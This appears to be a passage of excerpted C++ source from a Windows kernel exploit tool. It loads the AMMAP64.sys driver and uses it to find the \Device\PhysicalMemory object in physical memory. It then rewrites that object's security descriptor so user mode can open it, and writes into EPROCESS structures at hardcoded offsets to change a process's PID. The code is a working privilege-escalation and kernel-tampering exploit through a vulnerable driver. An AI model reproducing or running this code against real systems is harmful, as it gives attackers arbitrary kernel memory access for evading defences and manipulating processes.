...
PhysicalMemoryWrapper::PhysicalMemoryWrapper(bool bUseHardcoded)
{
	if (bUseHardcoded) {
		EPNameOffset = 0x450;
		EPPidOffset = 0x02E0;
...
bool PhysicalMemoryWrapper::change_pid(int pid, uint64_t eprocess)
{
	if (!eprocess)
		return false;
	uint64_t pid64 = pid;
	if (!WriteVirtual(GetKernelDirBase(), eprocess + EPPidOffset, (uint8_t*)&pid64, sizeof(pid64)))
		return false;
	return true;
}
...
bool MemoryIO::change_pid(int inewpid)
{
	return physmem_api.change_pid(inewpid, cached_eprocess);
}
...
void Driver_Exploit::patch(bool bPatch)
{
	IoCommand myIo = { 0 };
	myIo.offset = 0x0;
...
{
	system("\"load driver.bat\"");
	physmem_object_header = get_physmem_object_header_physical_address();
	hDriver = OpenDriver();
	if (!hDriver || hDriver == (HANDLE)-1)
		throw std::exception("Driver AMMAP64.sys is not running, probably failed to load.");

	if (!SFSetup()) {
		::CloseHandle(hDriver);
		throw std::exception("Please run as admin.\n");
	}
	...
	if (physmem_object_header == NULL) {
		//address is not cached, we have to re-scan memory and find it again.
		IoCommand myIo = { 0 };
		myIo.offset = 0x0;
		myIo.read.QuadPart = 0x2000;
				...
				while (true) {
					...
					if (0x74636553 == (pPoolHeader->PoolTag & 0x7FFFFFFF)) {
						...
						if (pObjectHeader->HandleCount >= 0 && pObjectHeader->HandleCount <= 3 && pObjectHeader->KernelObject == 1 && pObjectHeader->Flags == 0x16 && pObjectHeader->KernelOnlyAccess == 1)
						{
							...
							printf("PhysicalMemory Object Header Address: %p\n", (uint8_t*)physmem_object_header);
							printf("A, B: %p, %p\n", (uint8_t*)(((uint64_t)lpCursor / 0x1000) * 0x1000), (uint8_t*)(myIo.virtualmemory));
		...
		if (!bFound) {
			CloseHandle(hDriver);
			throw std::runtime_error("Read " + std::to_string(myIo.offset) + " bytes without finding the physical address, did you already patch?\n");
		}
		if (!ChangeSecurityDescriptorPhysicalMemory()) {
			CloseHandle(hDriver);
			throw std::exception("Failed to open hande on \\Device\\PhysicalMemory from usermode, either you don't have Administrator privilege or the exploit failed.");
		}
	}
}
...
Driver_Exploit::~Driver_Exploit()
{
	...
	patch(false);
	if (physmem_object_header)
		cout << "Unpatched session." << endl;
	else
		cout << "Failed to unpatch session." << endl;

	CloseHandle(hDriver);
	system("\"unload driver.bat\"");
}